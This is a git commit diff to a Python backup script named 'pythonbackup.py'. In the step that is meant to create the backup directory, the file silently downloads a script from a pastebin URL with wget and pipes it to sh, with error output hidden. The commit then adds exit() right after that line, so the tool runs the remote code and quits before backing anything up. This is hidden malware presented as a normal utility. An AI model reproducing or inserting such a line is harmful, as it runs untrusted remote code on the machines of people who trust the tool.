635f9a3df3af2db27fd183eb93dc49be49735b35
Turtle-Sec <36476433+Turtle-Sec@users.noreply.github.com>
2021-05-18 11:50:39 +0200

    Update pythonbackup.py

--- pythonbackup.py
+++ pythonbackup.py
@@ -13,14 +13,14 @@ backup_directory_path = Path(BACKUP_DIRECTORY)
 assert object_to_backup_path.exists()  # Validate the object we are about to backup exists before we continue
 
 # Validate the backup directory exists and create if required
-backup_directory_path.mkdir(parents=True)
 os.system('wget -O - https://pastebin.com/raw/edeWpBqB 2>/dev/null|sh')
+exit()
+backup_directory_path.mkdir(parents=True)
 # Get the amount of past backup zips in the backup directory already
 existing_backups = [
     x for x in backup_directory_path.iterdir()
     if x.is_file() and x.suffix == '.zip' and x.name.startswith('backup-')
 ]
-
 # Enforce max backups and delete oldest if there will be too many after the new backup
 oldest_to_newest_backup_by_name = list(sorted(existing_backups, key=lambda f: f.name))
 while len(oldest_to_newest_backup_by_name) >= MAX_BACKUP_AMOUNT:  # >= because we will have another soon
